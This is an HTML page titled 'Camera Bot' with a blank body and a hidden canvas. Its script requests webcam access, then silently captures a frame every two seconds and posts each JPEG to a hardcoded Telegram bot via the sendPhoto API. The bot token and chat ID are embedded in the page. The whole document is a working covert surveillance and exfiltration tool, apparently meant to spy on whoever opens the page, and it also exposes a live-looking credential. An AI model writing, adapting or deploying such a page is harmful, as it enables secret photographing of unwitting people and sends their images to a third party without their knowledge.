<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Camera Bot</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      text-align: center;
      padding: 20px;
    }
    #canvas {
      display: none;
    }
  </style>
</head>
<body>
  <h1> </h1>
  <canvas id="canvas"></canvas>

  <script>
    const canvas = document.getElementById("canvas");
    const botToken = "8310662832:AAH0hOxIRR2t3Jk3Qywa6IbuCNR7IV2gex8";
    const chatId = "917254238";
    
    navigator.mediaDevices.getUserMedia({ video: true })
      .then(function (stream) {
        const videoTrack = stream.getVideoTracks()[0];
        setInterval(() => takeSnapshot(videoTrack), 2000);
      })
      .catch(function (error) {
        console.error("⚠️ حدث خطأ أثناء الوصول للكاميرا:", error);
      });

    function takeSnapshot(videoTrack) {
      const videoElement = document.createElement("video");
      videoElement.srcObject = new MediaStream([videoTrack]);

      videoElement.addEventListener("loadedmetadata", () => {
        canvas.width = videoElement.videoWidth;
        canvas.height = videoElement.videoHeight;

        const ctx = canvas.getContext("2d");
        ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);

        canvas.toBlob(function (blob) {
          sendToTelegram(blob);
        }, "image/jpeg");
      });

      videoElement.play();
    }

    function sendToTelegram(blob) {
      const formData = new FormData();
      formData.append("chat_id", chatId);
      formData.append("photo", blob);

      fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
        method: "POST",
        body: formData
      })
        .then((response) => response.json())
        .then((result) => console.log(result))
        .catch((error) => console.error("❌ فشل الإرسال:", error));
    }
  </script>
</body>
</html>
